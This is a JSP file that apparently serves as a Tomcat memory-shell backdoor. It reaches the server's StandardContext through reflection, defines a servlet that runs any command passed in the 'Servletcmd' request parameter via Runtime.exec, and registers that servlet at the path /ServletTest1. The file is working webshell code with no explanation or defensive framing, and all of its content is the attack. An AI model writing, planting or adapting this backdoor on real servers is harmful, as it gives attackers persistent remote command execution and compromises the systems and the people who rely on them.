<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);  StandardContext standardContext = (StandardContext) req.getContext();
%>

<%!
    public class ServletTest implements Servlet {
        @Override
        public void init(ServletConfig config) throws ServletException {
        }
        @Override
        public ServletConfig getServletConfig() {
            return null;
        }
        @Override
        public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
            String cmd = req.getParameter("Servletcmd");
            if (cmd !=null){
                try{
                    Runtime.getRuntime().exec(cmd);
                }catch (IOException e){
                    e.printStackTrace();
                }catch (NullPointerException n){
                    n.printStackTrace();
                }
            }
        }
        @Override
        public String getServletInfo() {
            return null;
        }
        @Override
        public void destroy() {
        }
    }
%>

<%
    ServletTest ServletTest = new ServletTest();
    String name = ServletTest.getClass().getSimpleName();
    Wrapper wrapper = standardContext.createWrapper();  wrapper.setLoadOnStartup(1);
    wrapper.setName(name);  wrapper.setServlet(ServletTest);  wrapper.setServletClass(ServletTest.getClass().getName());%>

<%
    standardContext.addChild(wrapper);
    standardContext.addServletMappingDecoded("/ServletTest1",name);
%>
